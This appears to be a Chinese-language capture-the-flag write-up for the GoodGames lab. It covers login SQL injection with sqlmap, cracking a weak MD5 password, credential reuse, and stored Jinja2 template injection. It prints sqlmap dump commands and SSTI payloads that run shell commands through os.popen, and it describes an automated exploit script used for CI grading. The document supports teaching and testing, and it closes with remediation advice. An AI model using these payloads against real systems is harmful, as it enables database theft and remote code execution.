# GoodGames — Writeup

## 目标范围

本题复现 GoodGames 的 Web 攻击路径：前台登录 SQL 注入、用户表中的弱 MD5 密码、管理站点凭据复用，以及用户设置中的存储型 Jinja2 SSTI。

最终只要求读取 Web 服务账户 `augustus` 可访问的 `/home/augustus/user.txt`。不包含容器逃逸、Root Flag 或宿主机提权。

## 1. 侦察公开站点

访问公开游戏门户，观察登录/注册入口：

```bash
curl -i http://<TARGET>:5000/
```

通过浏览器开发者工具或代理捕获登录表单提交，确认请求发往 `POST /login`，表单包含 `email` 和 `password` 字段。先提交普通无效凭据，记录响应状态和行为。

## 2. 检查登录请求的输入处理

对 `email` 参数进行单引号和逻辑表达式测试，观察响应是否与普通无效登录不同。服务端将 email 直接拼接到 SQLite 查询语句，而密码字段会先计算 MD5。

可以使用 SQLMap 对请求进行枚举：

```bash
sqlmap -u 'http://<TARGET>:5000/login' \
  --data='email=test@example.com&password=invalid' \
  -p email --batch --dbms=SQLite
```

枚举数据库和表：

```bash
sqlmap -u 'http://<TARGET>:5000/login' \
  --data='email=test@example.com&password=invalid' \
  -p email --batch --dbms=SQLite --dbs
```

```bash
sqlmap -u 'http://<TARGET>:5000/login' \
  --data='email=test@example.com&password=invalid' \
  -p email --batch --dbms=SQLite -D main -T user --dump
```

用户表包含管理员邮箱及其 MD5 密码摘要。此处的关键是确认哈希来自数据库，而不是从页面源代码或静态文件中直接读取。

## 3. 恢复并验证凭据

将管理员 MD5 摘要交给离线字典工具恢复明文。该实验数据使用弱口令，且管理站点复用了相同凭据。

登录内部管理站点时，先检查公开页面、链接或主机名线索，随后将目标主机映射到：

```text
internal-administration.goodgames.htb
```

在实验环境中可以通过 hosts 文件或代理的 Host header 访问该虚拟主机。使用恢复的管理员凭据登录，进入 User Settings 页面。

## 4. 发现存储型模板求值

在 User Settings 的 Username 字段提交普通文本并保存，观察它如何重新显示。再提交一个无害的模板算术表达式：

```jinja2
{{7*7}}
```

保存后重新加载页面。如果字段显示计算结果而不是原始文本，说明存储值被当作 Jinja2 模板再次解析。

问题出在应用把数据库中的用户可控字符串传入 `render_template_string`，而不是把它作为普通模板变量渲染。

## 5. 验证命令执行并读取 Flag

在授权靶场中，可以通过 Jinja2 全局对象访问 Python 对象及其模块。例如，先确认命令执行身份：

```jinja2
{{ cycler.__init__.__globals__.os.popen('id -un').read() }}
```

本题 Web 服务以非特权用户 `augustus` 运行。确认执行身份后，读取目标文件：

```jinja2
{{ cycler.__init__.__globals__.os.popen('cat /home/augustus/user.txt').read() }}
```

将返回的 TTP Flag 提交到平台即可完成本题。

## 自动化验收

仓库中的 `exploit.py` 是独立 HTTP 攻击端，按顺序验证：

1. 利用登录 SQLi 将管理员 MD5 摘要带入正常账户页面；
2. 使用小型候选字典恢复弱口令；
3. 使用恢复的凭据登录内部管理虚拟主机；
4. 验证存储型 Jinja2 表达式求值；
5. 验证命令执行身份为 `augustus`；
6. 通过 SSTI 读取当前实例随机 Flag，并与 CI 预期答案精确比对。

CI 通过隔离 Docker 网络运行攻击端，不挂载目标文件系统、不使用 Docker socket，也不通过 `docker exec` 读取 Flag。

## 漏洞根因与修复

- SQL 注入：使用参数化查询，不要拼接用户输入构造 SQL。
- 弱密码存储：使用带唯一 salt 的 Argon2id、scrypt 或 bcrypt；不要使用快速哈希 MD5。
- 凭据复用：不同服务使用独立凭据，并配合 MFA 和最小权限。
- SSTI：不要把用户输入传给 `render_template_string`；使用固定模板并将用户内容作为普通上下文变量传入。
